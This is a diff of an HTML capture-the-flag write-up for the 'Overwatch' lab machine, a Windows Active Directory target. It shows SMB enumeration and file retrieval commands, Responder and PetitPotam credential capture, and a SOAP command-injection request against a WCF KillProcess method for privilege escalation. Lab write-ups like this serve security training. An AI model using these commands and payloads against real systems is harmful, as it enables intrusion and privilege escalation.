@@ -29,11 +29,12 @@
             <hr style="border: 0; border-top: 1px solid var(--border); margin: 30px 0;">
 
             <h2>Overview</h2>
-            <p>Overwatch is a Windows Active Directory machine that chains together several attack techniques: SMB enumeration leading to credential discovery in a .NET binary, SQL linked-server abuse to capture cleartext credentials via Responder, a foothold via WinRM, and finally privilege escalation through a vulnerable WCF SOAP service running as SYSTEM.</p>
+            <p>Overwatch is a Windows Active Directory machine that chains together several attack techniques: SMB enumeration leading to credential discovery in a .NET binary, SQL linked-server abuse to capture cleartext credentials via Responder, a foothold via WinRM, and finally privilege escalation through a vulnerable WCF SOAP service.</p>
 
             <h2>Reconnaissance</h2>
             <h3>Nmap</h3>
             <pre><code>nmap -sV 10.129.16.26 -vvv</code></pre>
+            <p>Key open ports identified during scanning:</p>
             <table>
                 <thead><tr><th>Port</th><th>Service</th></tr></thead>
                 <tbody>
@@ -42,26 +43,27 @@
                     <tr><td>135</td><td>MSRPC</td></tr>
                     <tr><td>389</td><td>LDAP (Domain: overwatch.htb)</td></tr>
                     <tr><td>445</td><td>SMB</td></tr>
-                    <tr><td>3389</td><td>RDP</td></tr>
                     <tr><td>3268</td><td>LDAP Global Catalog</td></tr>
+                    <tr><td>3389</td><td>RDP</td></tr>
                 </tbody>
             </table>
-            <p>The LDAP banner reveals the domain: <strong>overwatch.htb</strong> / host: <strong>S200401</strong>. Add to your hosts file:</p>
+            <p>The LDAP banner reveals the domain: <code>overwatch.htb</code> and host: <code>S200401</code>. Update your <code>/etc/hosts</code>:</p>
             <pre><code>10.129.16.26 overwatch.htb</code></pre>
 
             <h2>Enumeration</h2>
             <h3>SMB — Anonymous Access</h3>
             <pre><code>crackmapexec smb 10.129.16.26 -u guest -p '' --shares</code></pre>
-            <p>Accessible shares include <code>IPC$</code> and <code>software$</code> (READ access ✅).</p>
+            <p>Accessible shares found: <code>IPC$</code> (READ) and <code>software$</code> (READ ✅).</p>
 
             <h3>Exploring the software$ Share</h3>
             <p>Inside <code>\Monitoring\</code> there's a .NET application: <strong>overwatch.exe</strong>, along with its config file and PDB. Retrieving these files allows for local analysis:</p>
             <pre><code>smbclient //10.129.16.26/software$ -U guest%
 get overwatch.exe.config
-get overwatch.exe</code></pre>
+get overwatch.exe
+get overwatch.pdb</code></pre>
 
             <h3>WCF Service Discovery</h3>
-            <p>The config file reveals a WCF service endpoint. Port 8000 is filtered externally, meaning the service is only accessible from within the machine:</p>
+            <p>The config file reveals a WCF service. Port 8000 is filtered externally, accessible only from within the host:</p>
             <pre><code>&lt;add baseAddress="http://overwatch.htb:8000/MonitorService" /&gt;</code></pre>
 
             <h3>Credentials in the Binary</h3>
@@ -90,7 +92,7 @@ get overwatch.exe</code></pre>
             <p>BloodHound reveals the DC has <strong>Unconstrained Delegation</strong>. Using PetitPotam to coerce authentication to our listener captures the machine account hash (<code>S200401$</code>), enabling further escalation paths.</p>
 
             <h2>Privilege Escalation — WCF SOAP Injection</h2>
-            <p>The WCF service exposes a <code>KillProcess</code> method vulnerable to command injection. We send a crafted SOAP request to add our user to the local Administrators group:</p>
+            <p>The WCF service exposes a <code>KillProcess</code> method vulnerable to command injection. We send a crafted SOAP request from our WinRM session to escalate to Local Admin:</p>
             <pre><code># SOAP Injection Payload
 iwr http://overwatch.htb:8000/MonitorService `
   -Method POST `
@@ -105,24 +107,16 @@ iwr http://overwatch.htb:8000/MonitorService `
       &lt;/KillProcess&gt;
     &lt;/s:Body&gt;
   &lt;/s:Envelope&gt;"</code></pre>
-            <p>Verifying with <code>net localgroup Administrators</code> confirms success. A new Evil-WinRM session grants full root access.</p>
+            <p>Verify success: <code>net localgroup Administrators</code>. From here, a new session as Admin provides the root flag.</p>
 
             <h2>Attack Chain Summary</h2>
-            <pre><code>SMB Anonymous → WCF Config → SQL Creds → SQL Linked Server → Responder → WinRM → WCF Injection → Local Admin</code></pre>
+            <pre><code>SMB Discovery → WCF Config → SQL Creds → SQL Linked Server → Responder → WinRM → WCF Injection → SYSTEM</code></pre>
 
             <h2>Tools Used</h2>
-            <ul>
-                <li><code>nmap</code>, <code>crackmapexec</code>, <code>kerbrute</code></li>
-                <li><code>smbclient</code>, <code>impacket</code> suite</li>
-                <li><code>BloodHound</code>, <code>evil-winrm</code>, <code>responder</code></li>
-                <li><code>PetitPotam</code>, <code>dnstool.py</code></li>
-            </ul>
-
-            <div class="hero-meta" style="margin-top: 40px;">
-                <span>Attack Chain:</span>
-                <code>SMB → SQL Creds → Linked Server Abuse → WinRM → WCF Injection → SYSTEM</code>
+            <div class="hero-meta" style="background: none; border: none; padding: 0;">
+                <code>nmap</code> <code>crackmapexec</code> <code>kerbrute</code> <code>impacket</code> <code>BloodHound</code> <code>evil-winrm</code> <code>responder</code> <code>PetitPotam</code>
             </div>
-            
+
             <div style="margin-top: 50px;">
                 <a href="index.html" class="btn btn-primary">Return Home</a>
             </div>
